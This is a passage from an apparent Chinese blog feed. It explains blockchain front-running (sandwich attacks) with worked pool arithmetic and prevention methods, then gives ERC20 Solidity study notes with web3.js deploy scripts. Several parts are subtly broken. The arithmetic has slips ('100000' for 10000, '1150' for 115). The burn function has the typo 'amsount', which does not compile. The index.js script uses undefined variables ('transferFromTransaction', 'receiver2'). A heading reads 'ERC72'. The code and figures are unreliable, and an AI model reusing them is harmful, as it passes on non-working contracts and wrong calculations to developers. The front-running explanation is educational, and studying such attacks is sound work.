(注：为简化计算，以下均未考虑手续费)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1000-X) * (100+10) = 100000</span><br><span class="line">X = 90.9</span><br></pre></td></tr></table></figure><p>这笔交易中，A 的价格为 10/90.9 = 0.11，相比于原来 A 的价格，价格滑点为 :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0.11-0.1) / 0.1 = 0.1 = %10</span><br></pre></td></tr></table></figure><p>一笔交易就让币价产生了 10% 的滑点，可见越是流动性差的池子，遇到大额交易，越是容易产生滑点。如果能在用户正常的大额交易前（预计该交易会产生较大滑点），抢先买入 A，再在用户正常交易后，将刚买入的 A 卖出，就可以获得一笔不菲的收益。</p><p>例如，假设在 Alice 的交易前，Bob 抢先花 5 个 ETH 购买 A，然后在 Alice 的交易完成后，Bob 再把之前买入的 A 卖出</p><ol><li><p>首先是 Bob 的抢跑交易，Bob 用 5 ETH 购得 47.62 个 A：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1000 - X) * (100 + 5) = 10000</span><br><span class="line">X = 47.62</span><br><span class="line">A 的价格：0.10499</span><br></pre></td></tr></table></figure></li><li><p>接下来是 Alice 的正常交易，注意此时流动池中 A 的数量变为 952.38，ETH 的数量变为 105</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(952.38 - X) * (105 + 10) = 10000</span><br><span class="line">X = 82.81</span><br><span class="line">A 的价格：0.12075</span><br></pre></td></tr></table></figure></li><li><p>最后 Bob 卖出 47.62 个 A 的交易，此时流动性中 A 的数量为 869.57，ETH 的数量为 1150</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(869.57 + 47.62) * (115 - Y) = 10000</span><br><span class="line">Y = 5.97</span><br><span class="line">A 的价格：0.12536</span><br></pre></td></tr></table></figure></li></ol><p>通过这一次抢跑攻击，Bob 净赚 5.97-5 = 0.97 个 ETH，而 Alice 净亏 90.9-82.81 = 8.09 个 A，Bob 通过使 Alice 蒙受更大的滑点损失来获得自己的收益。</p><p>实际的抢跑攻击会更复杂，攻击者需要进行更精密的计算，以求实现以下两个目标：</p><ul><li><p>让用户的交易结果无限逼近用户自己设置的最大滑点（max_slippage），以求达到理论上的最大套利空间</p></li><li><p>在手续费竞争力和收益之间取得平衡，尽可能的在与其他机器人的竞争中获胜</p></li></ul><p><img src="/image/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93.assets/image-20230118005055941.png" alt="image-20230118005055941"></p><p>我们用图表来更好的解释这一过程：</p><ol><li>用户在 A 点，打算投入 in_amount(user) 个 USDT 购买 ETH，这笔交易正常会把当前状态推向 B，同时用户设置了最大滑点为 B(max_slippage)；</li><li>抢跑机器人监测到这笔交易，先于用户交易之前，进行了一笔 in_amount(robot) 个 USDT 的买入交易，将当前状态推到 A’；</li><li>用户的交易随后执行，达到其设置的最大滑点 B(max_slippage)；</li><li>抢跑机器人把步骤 2 中买入的 ETH 卖出，状态达到 C 点，得到 out_amount(robot) 个 USDT</li><li>抢跑机器人获得收益 out_amount(robot) - in_amount(robot)-手续费</li></ol><h3 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h3><p>以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p><ul><li>使用预提交方案(commit-reveal scheme)。</li><li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li><li>设置较低的交易滑点，比如 0.1%，这会让抢跑机器人缺少可盈利的空间，但是过低的滑点值会导致大额交易容易失败。</li><li>提高 gas 费用，增加攻击机器人的成本，但同样会增加自己的交易成本</li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">[1] WTF Solidity 合约安全: S11. 抢先交易</a></p><p><a href="https://learnblockchain.cn/article/2473">[2] 解析以太坊抢先交易原理及其解决方案</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;传统抢跑&quot;&gt;&lt;a href=&quot;#传统抢跑&quot; class=&quot;headerlink&quot; title=&quot;传统抢跑&quot;&gt;&lt;/a&gt;传统抢跑&lt;/h3&gt;&lt;p&gt;抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信</summary>
      
    
    
    
    <category term="智能合约 区块链" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>solidity应用学习笔记</title>
    <link href="https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/"/>
    <id>https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/</id>
    <published>2022-11-10T11:31:09.000Z</published>
    <updated>2023-01-12T15:35:33.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><p><code>ERC20</code>是以太坊上的代币标准，来自2015年11月V神参与的<a href="https://eips.ethereum.org/EIPS/eip-20"><code>EIP20</code></a>。它实现了代币转账的基本逻辑：</p><ul><li>IERC20 totalSupply: 获取该合约内总的 ERC20 Token 总量</li><li>balanceOf: 获取特定账户的 ERC20 Token 总量</li><li>transfer: 向目标账户转移特定数量的 ERC20 Token</li><li>allowance: 获取目标账户能够使用的源账户的 ERC20 Token 数量</li><li>approve: 向目标账户授权, 可以转移指定额度的 ERC20 Token 数量</li><li>transferFrom: ( 第三方调用 ) 从源账户向目标账户转移制定数量的 ERC20 Token</li></ul><h3 id="IERC20"><a href="#IERC20" class="headerlink" title="IERC20"></a>IERC20</h3><p><code>IERC20</code>是<code>ERC20</code>代币标准的接口合约，规定了<code>ERC20</code>代币需要实现的函数和事件。 之所以需要定义接口，是因为有了规范后，就存在所有的<code>ERC20</code>代币都通用的函数名称，输入参数，输出参数。 在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。 由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定共同数据。 这就是为什么需要<code>ERC20.sol</code>和<code>IERC20.sol</code>两个文件实现一个合约。</p><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><p><code>IERC20</code>定义了<code>2</code>个事件：<code>Transfer</code>事件和<code>Approval</code>事件，分别在转账和授权时被释放</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时.</span><br><span class="line"> */</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时.</span><br><span class="line"> */</span><br><span class="line">event Approval(address indexed owner, address indexed spender, uint256 value);</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>IERC20</code>一共定义了 6 个函数，提供了转移代币的基本功能，并允许代币获得批准，以便其他链上第三方使用。</p><ul><li><p>**totalSupply()**返回代币总量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回代币总供给.</span><br><span class="line"> */</span><br><span class="line">function totalSupply() external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**balanceof()**返回账户余额</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回账户`account`所持有的代币数.</span><br><span class="line"> */</span><br><span class="line">function balanceOf(address account) external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**transfer()**转账操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`.</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function transfer(address to, uint256 amount) external returns (bool);</span><br></pre></td></tr></table></figure></li><li><p>**allowance()**返回授权额度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。</span><br><span class="line"> *</span><br><span class="line"> * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变.</span><br><span class="line"> */</span><br><span class="line">function allowance(address owner, address spender) external view returns (uint256);</span><br></pre></td></tr></table></figure></li><li><p>**approve()**授权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 调用者账户给`spender`账户授权 `amount`数量代币。</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Approval&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function approve(address spender, uint256 amount) external returns (bool);</span><br></pre></td></tr></table></figure></li><li><p>**transferFrom()**授权转账</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。</span><br><span class="line"> *</span><br><span class="line"> * 如果成功，返回 `true`.</span><br><span class="line"> *</span><br><span class="line"> * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line"> */</span><br><span class="line">function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure></li></ul><h3 id="实现ERC20"><a href="#实现ERC20" class="headerlink" title="实现ERC20"></a>实现ERC20</h3><p>我们需要状态变量来记录账户余额，授权额度和代币信息。其中<code>balanceOf</code>, <code>allowance</code>和<code>totalSupply</code>为<code>public</code>类型，会自动生成一个同名<code>getter</code>函数，实现<code>IERC20</code>规定的<code>balanceOf()</code>, <code>allowance()</code>和<code>totalSupply()</code>。而<code>name</code>, <code>symbol</code>, <code>decimals</code>则对应代币的名称，代号和小数位数。</p><p><font color=red>用<code>override</code>修饰<code>public</code>变量，会重写继承自父合约的与变量同名的<code>getter</code>函数，比如<code>IERC20</code>中的<code>balanceOf()</code>函数。</font></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address =&gt; uint256) public override balanceOf;</span><br><span class="line"></span><br><span class="line">mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;</span><br><span class="line"></span><br><span class="line">uint256 public override totalSupply;   // 代币总供给</span><br><span class="line"></span><br><span class="line">string public name;   // 名称</span><br><span class="line">string public symbol;  // 代号</span><br><span class="line"></span><br><span class="line">uint8 public decimals = 18; // 小数位数</span><br></pre></td></tr></table></figure><p>下面是实现的合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC20.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.6.0 &lt;0.9.0;</span><br><span class="line">import &quot;./IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public override balanceOf;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;</span><br><span class="line"></span><br><span class="line">    uint256 public override totalSupply; // 代币总供给</span><br><span class="line"></span><br><span class="line">    string public name; // 名称</span><br><span class="line">    string public symbol; // 代号</span><br><span class="line"></span><br><span class="line">    uint8 public decimals = 18; // 小数位数</span><br><span class="line"></span><br><span class="line">    constructor(string memory _name, string memory _symbol) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        symbol = _symbol;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * transfer()</span><br><span class="line">     * 实现IERC20中的transfer函数，代币转账逻辑。</span><br><span class="line">     * 调用方扣除amount数量代币，接收方增加相应代币。</span><br><span class="line">     */</span><br><span class="line">    function transfer(address recipient, uint amount)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit Transfer(msg.sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * approve()</span><br><span class="line">     * 实现IERC20中的approve函数，代币授权逻辑。被授权方spender可以支配授权方(调用者)的amount数量的代币。</span><br><span class="line">     * spender可以是EOA账户，也可以是合约账户：当你用uniswap交易代币时，你需要将代币授权给uniswap合约。</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint amount)</span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * transferFrom()</span><br><span class="line">     * 实现IERC20中的授权转账逻辑，被授权方sender的amount数量的代币给接收方recipient(使用的是授权者账户中的代币)</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address sender,</span><br><span class="line">        address recipient,</span><br><span class="line">        uint amount</span><br><span class="line">    ) external override returns (bool) &#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * mint()函数：铸造代币函数，不在IERC20标准中。</span><br><span class="line">     * 这里为了教程方便，任何人可以铸造任意数量的代币，实际应用中会加权限管理，只有owner可以铸造代币：</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    function mint(uint amount) external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit Transfer(address(0), msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * burn()销毁代币函数，不在IERC20标准中。</span><br><span class="line">     */</span><br><span class="line">    function burn(uint amount) external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amsount;</span><br><span class="line">        emit Transfer(msg.sender, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//IERC20.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// WTF Solidity by 0xAA</span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=0.6.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev ERC20 接口合约.</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时.</span><br><span class="line">     */</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时.</span><br><span class="line">     */</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回代币总供给.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回账户`account`所持有的代币数.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`.</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。</span><br><span class="line">     *</span><br><span class="line">     * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 调用者账户给`spender`账户授权 `amount`数量代币。</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Approval&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。</span><br><span class="line">     *</span><br><span class="line">     * 如果成功，返回 `true`.</span><br><span class="line">     *</span><br><span class="line">     * 释放 &#123;Transfer&#125; 事件.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用-web3js-调用ERC20"><a href="#使用-web3js-调用ERC20" class="headerlink" title="使用 web3js 调用ERC20"></a>使用 web3js 调用ERC20</h3><p>在这里使用Ganache搭建的虚拟环境</p><p><img src="solidity%E5%BA%94%E7%94%A8.assets/image-20221110215538178.png" alt="image-20221110215538178"></p><p><code>compile.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let Web3 = require(&#x27;web3&#x27;)</span><br><span class="line">let solc = require(&#x27;solc&#x27;)</span><br><span class="line">let fs = require(&#x27;fs&#x27;)</span><br><span class="line"></span><br><span class="line">async function deployContract () &#123;</span><br><span class="line">    //首先读取文件</span><br><span class="line">    const source = fs.readFileSync(&#x27;ERC20.sol&#x27;, &#x27;utf8&#x27;)</span><br><span class="line"></span><br><span class="line">    // Get Path and Load Contract</span><br><span class="line">    function findImports (path) &#123;</span><br><span class="line">        if (fs.existsSync(path)) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                contents: fs.readFileSync(path, &#x27;utf8&#x27;),</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (fs.existsSync(&#x27;./node_modules/&#x27; + path)) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                contents: fs.readFileSync(&#x27;./node_modules/&#x27; + path, &#x27;utf8&#x27;),</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123; error: &#x27;File not found&#x27; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const input = &#123;</span><br><span class="line">        language: &#x27;Solidity&#x27;,</span><br><span class="line">        sources: &#123;</span><br><span class="line">            &#x27;ERC20.sol&#x27;: &#123;</span><br><span class="line">                content: source,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        settings: &#123;</span><br><span class="line">            outputSelection: &#123;</span><br><span class="line">                &#x27;*&#x27;: &#123;</span><br><span class="line">                    &#x27;*&#x27;: [&#x27;*&#x27;],</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    const tempFile = JSON.parse(</span><br><span class="line">        solc.compile(JSON.stringify(input), &#123; import: findImports &#125;)</span><br><span class="line">    )</span><br><span class="line">    const contractFile = tempFile.contracts[&#x27;ERC20.sol&#x27;][&#x27;ERC20&#x27;]</span><br><span class="line"></span><br><span class="line">    // Export Contract Data</span><br><span class="line">    module.exports = contractFile</span><br><span class="line">    console.log(&quot;Compile Success!&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deployContract().catch((error) =&gt; &#123;</span><br><span class="line">    console.error(error)</span><br><span class="line">    process.exitCode = 1</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>index.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const Web3 = require(&#x27;web3&#x27;)</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const contractFile = require(&#x27;./compile&#x27;)</span><br><span class="line"></span><br><span class="line">require(&#x27;dotenv&#x27;).config()</span><br><span class="line">const privateKey = process.env.PRIVATE_KEY</span><br><span class="line"></span><br><span class="line">//设置收款账户</span><br><span class="line">const receiver = &#x27;0x48a5B46E63aACd0EC6cDa708507C52e8C9bee33a&#x27;</span><br><span class="line"></span><br><span class="line">//构造web3对象</span><br><span class="line">const web3 = new Web3(new Web3.providers.HttpProvider(&quot;http://127.0.0.1:7545&quot;))</span><br><span class="line">// const providerRPC = &#123;</span><br><span class="line">//     development: &quot;http://127.0.0.1:8545&quot;</span><br><span class="line">// &#125;</span><br><span class="line">// const web3 = new Web3(providerRPC.development)</span><br><span class="line"></span><br><span class="line">//获取账户地址</span><br><span class="line">const account = web3.eth.accounts.privateKeyToAccount(privateKey)</span><br><span class="line">const account_from = &#123;</span><br><span class="line">    privateKey: account.privateKey,</span><br><span class="line">    accountAddress: account.address</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(account_from)</span><br><span class="line"></span><br><span class="line">//获取abi和bytecode</span><br><span class="line">const bytecode = contractFile.evm.bytecode.object</span><br><span class="line">const abi = contractFile.abi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const Trans = async () =&gt; &#123;</span><br><span class="line">    //部署合约</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 0. Deploy Contract&#x27;)</span><br><span class="line">    console.log(</span><br><span class="line">        `Attempting to deploy from account $&#123;account_from.accountAddress&#125;`</span><br><span class="line">    )</span><br><span class="line">    web3.eth.getBlockNumber(function (error, result) &#123;</span><br><span class="line">        console.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //使用对应的 abi 构造相应的合约实例</span><br><span class="line">    const deployContract = new web3.eth.Contract(abi)</span><br><span class="line"></span><br><span class="line">    //创建部署合约的交易</span><br><span class="line">    const deployTx = deployContract.deploy(&#123;</span><br><span class="line">        data: bytecode,</span><br><span class="line">        arguments: [&#x27;DAPPLEARNING&#x27;, &#x27;DAPP&#x27;],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //交易签名</span><br><span class="line">    const deployTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            data: deployTx.encodeABI(),</span><br><span class="line">            gas: 6700000</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //发送交易并获取交易回执</span><br><span class="line">    const deployReceipt = await web3.eth.sendSignedTransaction(deployTransaction.rawTransaction)</span><br><span class="line">    contractAddr = deployReceipt.contractAddress</span><br><span class="line">    console.log(`Contract deployed at address: $&#123;deployReceipt.contractAddress&#125;`)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //----------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">    const web3Socket = new Web3(</span><br><span class="line">        new Web3.providers.WebsocketProvider(</span><br><span class="line">            &#x27;http://127.0.0.1:7545&#x27;</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    erc20 = new web3Socket.eth.Contract(abi, deployReceipt.contractAddress)</span><br><span class="line"></span><br><span class="line">    erc20.events.Transfer(function (error, event) &#123;</span><br><span class="line">        console.log(&#x27;Mint Success&#x27;)</span><br><span class="line">        console.log(event.returnValues)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    erc20.events.Approval(function (error, event) &#123;</span><br><span class="line">        console.log(&#x27;Approval Success&#x27;)</span><br><span class="line">        console.log(event.returnValues)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //----------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //创建合约实例</span><br><span class="line">    const erc20Contract = new web3.eth.Contract(</span><br><span class="line">        abi,</span><br><span class="line">        deployReceipt.contractAddress</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    //创建交易 mint铸造token</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 1. Mint&#x27;)</span><br><span class="line"></span><br><span class="line">    const mintTx = erc20Contract.methods</span><br><span class="line">        .mint(100000)</span><br><span class="line">        .encodeABI()</span><br><span class="line"></span><br><span class="line">    const mintTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            to: deployReceipt.contractAddress,</span><br><span class="line">            data: mintTx,</span><br><span class="line">            gas: 6700000,</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(</span><br><span class="line">        mintTransaction.rawTransaction</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await erc20Contract.methods</span><br><span class="line">        .balanceOf(account.address)</span><br><span class="line">        .call()</span><br><span class="line">        .then((result) =&gt; &#123;</span><br><span class="line">            console.log(`The balance of account is $&#123;result&#125;`)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //授权</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 2. Approval&#x27;)</span><br><span class="line">    const approvalTx = erc20Contract.methods.approve(receiver, 666).encodeABI()</span><br><span class="line"></span><br><span class="line">    const approvalTransaction = await web3.eth.accounts.signTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            to: contractAddr,</span><br><span class="line">            data: approvalTx,</span><br><span class="line">            gas: 6700000</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.privateKey</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(approvalTransaction.rawTransaction)         //发送交易</span><br><span class="line"></span><br><span class="line">    let allowance = await erc20Contract.methods.allowance(account.address, receiver).call()</span><br><span class="line">    console.log(`allowance[$&#123;account.address&#125;][$&#123;receiver&#125;]:$&#123;allowance&#125;`)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //使用授权转账</span><br><span class="line">    console.log()</span><br><span class="line">    console.log(&#x27;============================ 3. TransferFrom&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    await web3.eth.sendSignedTransaction(transferFromTransaction.rawTransaction)     //发送交易</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(account.address).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;account.address&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(receiver2).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;receiver2&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    balance = await erc20Contract.methods.balanceOf(receiver).call()</span><br><span class="line">    console.log(`balanceOf[$&#123;receiver&#125;]:$&#123;balance&#125;`)</span><br><span class="line"></span><br><span class="line">    allowance = await erc20Contract.methods.allowance(account.address, receiver).call()</span><br><span class="line">    console.log(`allowance[$&#123;account.address&#125;][$&#123;receiver&#125;]:$&#123;allowance&#125;`)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trans().then(() =&gt; process.exit(0)).catch((error) =&gt; &#123;</span><br><span class="line">    console.error(error)</span><br><span class="line">    process.exit(1)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="ERC72"><a href="#ERC72" class="headerlink" title="ERC72"></a>ERC72</h2><p><code>BTC</code>和<code>ETH</code>这类代币都属于同质化代币，矿工挖出的第<code>1</code>枚<code>BTC</code>与第<code>10000</code>枚<code>BTC</code>并没有不同，是等价的。但世界中很多物品是不同质的，其中包括房产、古董、虚拟艺术品等等，这类物品无法用同质化代币抽象。因此，<a href="https://eips.ethereum.org/EIPS/eip-721">以太坊EIP721</a>提出了<code>ERC721</code>标准，来抽象非同质化的物品。这一讲，我们将介绍<code>ERC721</code>标准，并基于它发行一款<code>NFT</code>。</p><h4 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h4><p><code>EIP</code>全称 <code>Ethereum Imporvement Proposals</code>(以太坊改进建议), 是以太坊开发者社区提出的改进建议, 是一系列以编号排定的文件, 类似互联网上IETF的RFC。</p><p><code>EIP</code>可以是 